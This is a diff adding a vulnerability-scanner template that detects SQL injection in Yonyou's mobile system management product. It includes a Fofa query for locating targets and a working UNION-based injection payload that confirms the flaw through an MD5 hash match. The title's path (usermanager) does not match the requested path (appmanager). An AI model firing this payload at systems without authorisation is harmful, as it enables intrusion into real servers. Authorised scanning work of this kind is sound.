@@ -1,0 +1,24 @@
+id: yonyou-usermanager-init-sqli
+
+info:
+  name: 用友移动系统管理 /maportal/usermanager/init 存在SQL注入漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: "移动系统管理"
+  reference:
+    - https://mp.weixin.qq.com/s/9yZ6kYfku-fXFwtwAc5Alg
+  tags: yonyou,sqli
+  created: 2024/01/07
+
+set:
+  randstr: randomLowercase(5)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /maportal/appmanager/init
+      body: appname=qaxnb' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('md5','test')),NULL,NULL,NULL,NULL,NULL,NULL--&sys_type=&loginmode=
+    expression: response.status == 200 && response.body.bcontains(b'c8059e2ec7419f590e79d7f1b774bfe6')
+expression: r0()
